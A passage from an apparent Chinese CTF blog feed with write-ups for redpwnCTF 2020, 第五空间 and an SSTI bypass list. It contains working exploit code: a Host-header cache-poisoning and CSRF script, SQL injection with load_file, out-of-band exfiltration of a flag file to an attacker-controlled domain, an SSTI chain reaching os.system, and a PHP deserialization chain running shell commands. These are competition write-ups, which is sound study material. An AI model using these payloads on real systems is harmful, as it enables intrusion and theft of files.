class="hljs-string">&#x27;x-real-ip&#x27;</span>]</code></pre><p>analyticsUrl由<code>req.headers[&#39;host&#39;]</code>传入，要怎么构造捏</p><p>我们需要xss让admin访问<code>http://2020.redpwnc.tf:31291/admin/create?viperId=&#123;&#125;&amp;csrfToken=&#123;&#125;</code>也就是需要把这个构造到host里面，有几个坑</p><ol><li><code>/</code>不能传入host</li><li><code>csrfToken</code>未知</li><li>有csp</li><li><code>&amp;</code>被html编码</li></ol><p>第一个直接用反斜杠代替就好，需要传入的<code>csrfToken</code>，访问<code>http://2020.redpwnc.tf:31291/analytics?ip_address=__csrftoken__admin_account</code>获取数字base64加密后就是<code>csrfToken</code>。绕csp的话可以利用<code>analytics.js</code>,只有一行</p><pre><code class="hljs javascript">fetch(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;analyticsUrl&quot;</span>).innerHTML)</code></pre><p>fetch可以请求网址，正好可以用来csrf。最后因为要传两个参需要<code>&amp;</code>,但是<code>innerHTML</code>提取时<code>&amp;</code>会被解析，使用注释符号包裹<code>innerHTML</code>提取就不会解析<code>&amp;</code>了。</p><p>最后构造的host</p><pre><code class="hljs xml">Host: 2020.redpwnc.tf:31291\admin\create?x=<span class="hljs-comment">&lt;!--&amp;viperId=AAAAAAAA-AAAA-4AAA-8AAA-AAAAAAAAAAAA&amp;csrfToken=&lt;BASE64 encoded token&gt;#--&gt;</span></code></pre><p>exp</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> requests, socket, re<span class="hljs-keyword">import</span> uuid<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encodeHOST, PORT = <span class="hljs-string">&quot;2020.redpwnc.tf&quot;</span>, <span class="hljs-number">31291</span><span class="hljs-comment">#HOST, PORT = &quot;localhost&quot;, 31337</span>ADMIN_VIPER = <span class="hljs-built_in">str</span>(uuid.uuid4())<span class="hljs-comment"># Create new viper and fetch cookie and Viper ID</span>r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/create&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT), allow_redirects=<span class="hljs-literal">False</span>)viper_id = re.findall(<span class="hljs-string">&quot;([a-f0-9]&#123;8&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;12&#125;)&quot;</span>, r.text)[<span class="hljs-number">0</span>]sessid = r.cookies[<span class="hljs-string">&quot;connect.sid&quot;</span>]cookies = &#123;<span class="hljs-string">&quot;connect.sid&quot;</span> : sessid&#125;<span class="hljs-comment"># Get the csrf token</span>r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/analytics?ip_address=__csrftoken__admin_account&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT))csrftoken = quote(b64encode(r.text.split()[-<span class="hljs-number">2</span>].encode()))<span class="hljs-comment"># Inject host header</span>payload = <span class="hljs-string">&quot;&quot;</span>payload += <span class="hljs-string">&quot;GET /viper/&#123;&#125; HTTP/1.1\r\n&quot;</span>.<span class="hljs-built_in">format</span>(viper_id)payload += <span class="hljs-string">&quot;Host: &#123;&#125;:&#123;&#125;\\admin\\create?x=&lt;!--&amp;viperId=&#123;&#125;&amp;csrfToken=&#123;&#125;#--&gt;\r\n&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, ADMIN_VIPER, csrftoken)payload += <span class="hljs-string">&quot;Accept: */*\r\n&quot;</span>payload += <span class="hljs-string">&quot;Cookie: connect.sid=&#123;&#125;\r\n&quot;</span>.<span class="hljs-built_in">format</span>(sessid)payload += <span class="hljs-string">&quot;\r\n&quot;</span>s = socket.socket()s.connect((HOST, PORT))s.sendall(payload.encode())print(s.recv(<span class="hljs-number">32768</span>))s.close()<span class="hljs-comment"># Cache request</span>r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, viper_id), cookies=cookies)print(r.text)print(<span class="hljs-string">&quot;Send this URL to the admin&quot;</span>)print(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, viper_id))<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nClick to continue fetching http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125; ... &quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, ADMIN_VIPER))    r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, ADMIN_VIPER), cookies=cookies)    print(r.text)</code></pre><p>提交网址后在访问下admin创建的页面就能看到flag了</p><p><img src="https://s1.ax1x.com/2020/07/03/Njr7OH.png" alt="Njr7OH.png"></p><p>参考: <a href="https://ctftime.org/writeup/21819">https://ctftime.org/writeup/21819</a></p><h2 id="web-got-stacks"><a href="#web-got-stacks" class="headerlink" title="web/got-stacks"></a>web/got-stacks</h2><blockquote><p>This website has great products! Thankfully there are enough products to go around; I’m tryna burn some mad stacks for you all.</p><p>Site: <a href="https://got-stacks.2020.redpwnc.tf/">got-stacks.2020.redpwnc.tf</a></p></blockquote><p>题目是一个类似商品页，可以注测用户，同样也给了源码</p><pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-comment">/*</span><span class="hljs-comment"> *  @REDPWNCTF 2020</span><span class="hljs-comment"> *  @AUTHOR Jim</span><span class="hljs-comment"> */</span><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;mysql&quot;</span>);<span class="hljs-keyword">const</span> request = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;request&quot;</span>);<span class="hljs-keyword">const</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;url&quot;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<span class="hljs-keyword">const</span> conn = mysql.createConnection(&#123;    host: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,    port: <span class="hljs-string">&quot;3306&quot;</span>,    user: <span class="hljs-string">&quot;redpwnuser&quot;</span>,    password: <span class="hljs-string">&quot;redpwnpassword&quot;</span>,    database: <span class="hljs-string">&quot;gotstacks&quot;</span>,    multipleStatements: <span class="hljs-string">&quot;true&quot;</span>&#125;);conn.connect(&#123; <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)</span>&#123;        <span class="hljs-keyword">if</span>(err)&#123;            <span class="hljs-keyword">throw</span> err;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;mysql connection success&quot;</span>);        &#125;    &#125;&#125;);<span class="hljs-keyword">const</span> KEYWORDS = [    <span class="hljs-string">&quot;union&quot;</span>,    <span class="hljs-string">&quot;and&quot;</span>,    <span class="hljs-string">&quot;or&quot;</span>,    <span class="hljs-string">&quot;sleep&quot;</span>,    <span class="hljs-string">&quot;hex&quot;</span>,    <span class="hljs-string">&quot;char&quot;</span>,    <span class="hljs-string">&quot;db&quot;</span>,    <span class="hljs-string">&quot;\\\\&quot;</span>,    <span class="hljs-string">&quot;/&quot;</span>,    <span class="hljs-string">&quot;*&quot;</span>,    <span class="hljs-string">&quot;load_file&quot;</span>,    <span class="hljs-string">&quot;0x&quot;</span>,    <span class="hljs-string">&quot;fl&quot;</span>,    <span class="hljs-string">&quot;ag&quot;</span>,    <span class="hljs-string">&quot;txt&quot;</span>,    <span class="hljs-string">&quot;if&quot;</span>];<span class="hljs-keyword">const</span> waf = <span class="hljs-function">(<span class="hljs-params">str</span>) =&gt;</span> &#123;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> i <span class="hljs-keyword">in</span> KEYWORDS)&#123;        <span class="hljs-keyword">const</span> key = KEYWORDS[i];        <span class="hljs-keyword">if</span>(str.toLowerCase().indexOf(key) !== -<span class="hljs-number">1</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">const</span> isValid = <span class="hljs-function">(<span class="hljs-params">ip</span>) =&gt;</span> &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/</span>.test(ip))&#123;      <span class="hljs-keyword">return</span> (<span class="hljs-literal">true</span>)    &#125;  <span class="hljs-keyword">return</span> (<span class="hljs-literal">false</span>)&#125;<span class="hljs-keyword">const</span> isPrivate = <span class="hljs-function">(<span class="hljs-params">ip</span>) =&gt;</span> &#123;    <span class="hljs-keyword">const</span> parts = ip.split(<span class="hljs-string">&quot;.&quot;</span>);    <span class="hljs-keyword">return</span> parts[<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;10&#x27;</span> ||     (parts[<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;172&#x27;</span> &amp;&amp; (<span class="hljs-built_in">parseInt</span>(parts[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>) &gt;= <span class="hljs-number">16</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(parts[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>) &lt;= <span class="hljs-number">31</span>)) ||     (parts[<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;192&#x27;</span> &amp;&amp; parts[<span class="hljs-number">1</span>] === <span class="hljs-string">&#x27;168&#x27;</span>);&#125;<span class="hljs-keyword">const</span> app = express();app.use(express.static(__dirname + <span class="hljs-string">&quot;/public&quot;</span>));app.use(bodyParser.json());app.post(<span class="hljs-string">&quot;/api/initializedb&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;    <span class="hljs-keyword">const</span> body = req.body;    <span class="hljs-keyword">if</span>(body.hasOwnProperty(<span class="hljs-string">&quot;filename&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(!fs.readdirSync(<span class="hljs-string">&#x27;db&#x27;</span>).includes(body.filename)) <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;File not found&quot;</span>);        <span class="hljs-keyword">try</span>&#123;            <span class="hljs-keyword">const</span> sql = fs.readFileSync(<span class="hljs-string">&quot;db/&quot;</span> + body.filename).toString();            conn.query(sql, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;                res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! Database has been intialized&quot;</span>);            &#125;);        &#125; <span class="hljs-keyword">catch</span>(err)&#123;            <span class="hljs-keyword">if</span>(err.code = <span class="hljs-string">&quot;EOENT&quot;</span>)&#123;                res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;File not found&quot;</span>);            &#125;<span class="hljs-keyword">else</span>&#123;                res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);            &#125;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);    &#125;&#125;);app.post(<span class="hljs-string">&quot;/api/registerproduct&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">const</span> body = req.body;    <span class="hljs-keyword">if</span>(body.hasOwnProperty(<span class="hljs-string">&quot;stockid&quot;</span>) &amp;&amp; body.hasOwnProperty(<span class="hljs-string">&quot;name&quot;</span>) &amp;&amp; body.hasOwnProperty(<span class="hljs-string">&quot;quantity&quot;</span>) &amp;&amp; body.hasOwnProperty(<span class="hljs-string">&quot;vurl&quot;</span>))&#123;        <span class="hljs-keyword">if</span>(!(waf(body.stockid) || waf(body.name) || waf(body.quantity) || waf(body.vurl)))&#123;            <span class="hljs-keyword">let</span> query = <span class="hljs-string">&quot;SELECT * FROM stock WHERE stockid = ? LIMIT 1&quot;</span>;            conn.query(query, [req.body.stockid], <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;                <span class="hljs-keyword">if</span> (error)&#123;                    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Internal server error&quot;</span>);                    <span class="hljs-keyword">return</span>;                &#125;                    <span class="hljs-keyword">if</span>(results.length &gt; <span class="hljs-number">0</span>)&#123;                    res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;stockID already exists&quot;</span>);                    <span class="hljs-keyword">return</span>;                &#125;<span class="hljs-keyword">else</span>&#123;                    query = <span class="hljs-string">&quot;INSERT INTO stock (stockid, name, quantity, vurl) VALUES (&quot;</span> + body.stockid + <span class="hljs-string">&quot;, &#x27;&quot;</span> + body.name + <span class="hljs-string">&quot;&#x27;, &quot;</span> + body.quantity + <span class="hljs-string">&quot;, &#x27;&quot;</span> + body.vurl + <span class="hljs-string">&quot;&#x27;);&quot;</span>;                    conn.query(query, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;                        res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! Record was created&quot;</span>);                    &#125;);                &#125;            &#125;);        &#125;<span class="hljs-keyword">else</span>&#123;            res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&quot;Hacking attempt detected&quot;</span>);        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);    &#125;&#125;);app.post(<span class="hljs-string">&quot;/api/notifystock&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;    <span class="hljs-keyword">const</span> body = req.body;    <span class="hljs-keyword">if</span>(body.hasOwnProperty(<span class="hljs-string">&quot;stockid&quot;</span>))&#123;        <span class="hljs-keyword">let</span> query = <span class="hljs-string">&quot;SELECT * FROM stock WHERE stockid = ? LIMIT 1&quot;</span>;        conn.query(query, [req.body.stockid], <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;            <span class="hljs-keyword">if</span> (error)&#123;                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Internal server error&quot;</span>);                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-keyword">if</span>(results.length &gt; <span class="hljs-number">0</span>)&#123;                <span class="hljs-keyword">if</span>(results[<span class="hljs-number">0</span>].quantity &gt; <span class="hljs-number">0</span>)&#123;                    res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Stock is not empty!&quot;</span>);                &#125;<span class="hljs-keyword">else</span>&#123;                    <span class="hljs-keyword">if</span>(isValid(results[<span class="hljs-number">0</span>].vurl.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]) &amp;&amp; isPrivate(results[<span class="hljs-number">0</span>].vurl.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]))&#123;                        <span class="hljs-keyword">try</span> &#123;                            request.get(<span class="hljs-string">&quot;http://&quot;</span> + results[<span class="hljs-number">0</span>].vurl);                        &#125; <span class="hljs-keyword">catch</span>(err)&#123;                            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;get request failed&quot;</span>);                        &#125;                        res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Thank you! The vendor has been notified&quot;</span>);                    &#125;<span class="hljs-keyword">else</span>&#123;                        <span class="hljs-keyword">let</span> options = &#123;                            url: <span class="hljs-string">&quot;https://dns.google.com/resolve?name=&quot;</span> + results[<span class="hljs-number">0</span>].vurl.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&amp;type=A&quot;</span>,                            method: <span class="hljs-string">&quot;GET&quot;</span>,                            headers: &#123;                                <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>                            &#125;                        &#125;                        request(options, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, dnsRes, body</span>)</span>&#123;                            <span class="hljs-keyword">let</span> jsonRes;                            <span class="hljs-keyword">try</span> &#123;                                jsonRes = <span class="hljs-built_in">JSON</span>.parse(body);                            &#125;<span class="hljs-keyword">catch</span>(err)&#123;                                res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);                                <span class="hljs-keyword">return</span>;                            &#125;                            <span class="hljs-keyword">try</span> &#123;                                <span class="hljs-keyword">const</span> ip = jsonRes[<span class="hljs-string">&quot;Answer&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;data&quot;</span>];                                <span class="hljs-keyword">if</span>(isPrivate(ip))&#123;                                    <span class="hljs-keyword">try</span>&#123;                                        request.get(<span class="hljs-string">&quot;http://&quot;</span> + results[<span class="hljs-number">0</span>].vurl);                                    &#125; <span class="hljs-keyword">catch</span>(err)&#123;                                        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;get request failed&quot;</span>);                                    &#125;                                    res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Thank you! The vendor has been notified&quot;</span>);                                &#125;<span class="hljs-keyword">else</span>&#123;                                    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&quot;Thank you! But the address the vendor provided is improper, we will let them know next time we see them&quot;</span>);                                &#125;                            &#125;<span class="hljs-keyword">catch</span>(err)&#123;                                res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&quot;Thank you! But the address the vendor provided is improper, we will let them know next time we see them&quot;</span>);                            &#125;                        &#125;)                    &#125;                &#125;            &#125;<span class="hljs-keyword">else</span>&#123;                res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&quot;Stockid not found&quot;</span>);            &#125;        &#125;);    &#125;<span class="hljs-keyword">else</span>&#123;        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);    &#125;&#125;);app.listen(<span class="hljs-number">31337</span>, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;express listening on 31337&quot;</span>);&#125;);</code></pre><p>看过滤的KEYWORDS就大概可以猜出有注入，在insert那有注入，几个参数都可控，都是注册传入的参数。flag从给的源码压缩包中的dockerfile看是要<code>load_file</code>读<code>/home/ctf/flag.txt</code>，但是几个关键字都给过滤了。这里用预编译语句+16进制，或者用base64绕过这些过滤，有两种方法做接下来，一种外带回显，一种时间盲注。</p><p>先说简单的时间盲注</p><pre><code class="hljs json"># (select if((select substr(load_file(&#x27;/home/ctf/flag.txt&#x27;),1,1)) like binary &#x27;f&#x27;,sleep(6),1))&#123;<span class="hljs-attr">&quot;stockid&quot;</span>:<span class="hljs-string">&quot;2555&quot;</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-attr">&quot;quantity&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-attr">&quot;vurl&quot;</span>:<span class="hljs-string">&quot;sf&#x27;); set @s=(select from_base64(&#x27;c2VsZWN0IGlmKChzZWxlY3Qgc3Vic3RyKGxvYWRfZmlsZSgnL2hvbWUvY3RmL2ZsYWcudHh0JyksMSwxKSkgbGlrZSBiaW5hcnkgJ2YnLHNsZWVwKDYpLDEp&#x27;));PREPARE gsgs FROM @s;EXECUTE gsgs;#&quot;</span>&#125;&#123;<span class="hljs-attr">&quot;stockid&quot;</span>:<span class="hljs-string">&quot;2560&quot;</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-attr">&quot;quantity&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-attr">&quot;vurl&quot;</span>:<span class="hljs-string">&quot;sf&#x27;); set @s=(select x&#x27;73656c656374206966282873656c65637420737562737472286c6f61645f66696c6528272f686f6d652f6374662f666c61672e74787427292c312c312929206c696b652062696e617279202766272c736c6565702836292c3129&#x27;);PREPARE gsgs FROM @s;EXECUTE gsgs;#&quot;</span>&#125;</code></pre><p>预期应该是外带，因为还有个路由可以访问vurl，但是有限制需要绕DNS，使得<code>https://dns.google.com/resolve?name=&#123;vurl&#125;&amp;type=A</code>查询出的结果能过<code>const isPrivate</code> ，即data为192.168开头。</p><p>利用<a href="http://xip.io/">http://xip.io/</a></p><p><a href="http://www.192.168.1.1.xip.io会解析到192.168.1.1/">www.192.168.1.1.xip.io会解析到192.168.1.1</a></p><p>nodejs中</p><p>request.get(‘http://域名:<a href="http://www.192.168.1.1.xip.io&/#39;">www.192.168.1.1.xip.io&#39;</a>) 会访问到域名，域名绑定到服务器，起个服务监听会显示访问记录</p><p>而且<code>https://dns.google.com/resolve?name=域名:www.192.168.1.1.xip.io&amp;type=A</code>显示的data为192.168.1.1满足条件</p><p>即要写入的<code>vurl</code>为</p><pre><code class="hljs reasonml">concat(&#x27;域名:www.<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>.xip.io&#x27;,<span class="hljs-constructor">LOAD_FILE(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">home</span><span class="hljs-operator">/</span><span class="hljs-params">ctf</span><span class="hljs-operator">/</span>ﬂ<span class="hljs-params">ag</span>.<span class="hljs-params">txt</span>&#x27;)</span>)</code></pre><p>访问时就会带出flag,把下面语句base64或者16进制套到预编译语句里面，在访问<code>/api/notifystock </code>传入{“stockid”:”2333”}，服务器上应该有回显</p><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> stock (stockid, <span class="hljs-keyword">name</span>, quantity, vurl) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2333</span>, <span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-number">22</span>, <span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;域名:www.192.168.1.1.xip.io&#x27;</span>,<span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">&#x27;/home/ctf/ﬂag.txt&#x27;</span>)));</code></pre><p>参考: <a href="https://ctftime.org/task/12160">https://ctftime.org/task/12160</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redpwnCTF2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[护网杯 2018]easy_laravel</title>
    <link href="/2020/06/28/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-laravel/"/>
    <url>/2020/06/28/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-laravel/</url>
    
    <content type="html"><![CDATA[<p>看到composer.json 首先用composer install一下安装一下依赖</p><p>laravel 中可以用<code>php artisan route:list</code>查看一下路由</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI绕过收集</title>
    <link href="/2020/06/28/SSTI%E7%BB%95%E8%BF%87%E6%94%B6%E9%9B%86/"/>
    <url>/2020/06/28/SSTI%E7%BB%95%E8%BF%87%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤."></a>过滤<code>.</code></h2><p>getattr()返回一个对象属性值</p><pre><code class="hljs python"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>([],<span class="hljs-string">&#x27;__cla&#x27;</span>+<span class="hljs-string">&#x27;ss__&#x27;</span>),<span class="hljs-string">&#x27;__mr&#x27;</span>+<span class="hljs-string">&#x27;o__&#x27;</span>)[<span class="hljs-number">1</span>],<span class="hljs-string">&#x27;__subclas&#x27;</span>+<span class="hljs-string">&#x27;ses__&#x27;</span>)()[<span class="hljs-number">104</span>],<span class="hljs-string">&#x27;__init__&#x27;</span>),<span class="hljs-string">&#x27;__glob&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>)[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>],<span class="hljs-string">&#x27;mod&#x27;</span>+<span class="hljs-string">&#x27;ules&#x27;</span>)[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>],<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;ste&#x27;</span>+<span class="hljs-string">&#x27;m&#x27;</span>)(<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)</code></pre><p>attr()  jinja内置过滤器</p><pre><code class="hljs python">foo|attr(<span class="hljs-string">&quot;bar&quot;</span>) 类似于 foo.bar()|attr(request.args.x1)</code></pre><p><a href="https://www.anquanke.com/post/id/188172#h3-3">https://www.anquanke.com/post/id/188172#h3-3</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第五空间</title>
    <link href="/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
    <url>/2020/06/24/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a>hate-php</h2><p>取反绕过 当时忘记了要加括号qwq</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">121.36.74.163</span>/?code=(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)((~%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>B%DF%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D<span class="hljs-number">1</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F))</code></pre><h2 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h2><p>非预期</p><pre><code class="hljs autoit">$poc=$_SERVER[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]<span class="hljs-comment">;</span></code></pre><p>不会urldecode,所以直接传过去curl file:///var/www/html/flag.php</p><p>payload</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">121.36.64.91</span>/index.php?a=<span class="hljs-number">2</span>&amp;b=<span class="hljs-number">2</span>&amp;url=%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">77</span>%<span class="hljs-number">77</span>%<span class="hljs-number">77</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">68</span>%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">6</span>c%<span class="hljs-number">2</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">70</span></code></pre><h2 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h2><p>先找<code>__destruct()</code> 然后找<code>__call</code>,最后发现<code>call_user_func_array</code> 传一个sysytem</p><p>exp</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">Symfony</span>\<span class="hljs-title">Component</span>\<span class="hljs-title">Routing</span>\<span class="hljs-title">Loader</span>\<span class="hljs-title">Configurator</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">ImportConfigurator</span>    &#123;        <span class="hljs-title">public</span> $<span class="hljs-title">parent</span>;        <span class="hljs-keyword">public</span> <span class="hljs-variable">$route</span> = <span class="hljs-string">&quot;cat /flag&quot;</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;parent-&gt;addCollection(<span class="hljs-keyword">$this</span>-&gt;route);        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;    <span 